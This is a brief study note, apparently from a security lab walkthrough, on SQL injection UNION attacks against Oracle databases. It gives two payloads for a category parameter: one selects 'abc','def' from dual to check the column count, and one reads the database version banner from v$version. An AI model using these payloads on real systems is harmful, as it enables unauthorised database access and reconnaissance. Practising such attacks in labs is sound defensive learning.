---
dg-publish: true
---






- On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.
- In the category params insert: — to verify that query returns two columns
    - `'+UNION+SELECT+'abc','def'+FROM+dual--`
- Use the following payload to display the database version:
    - `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`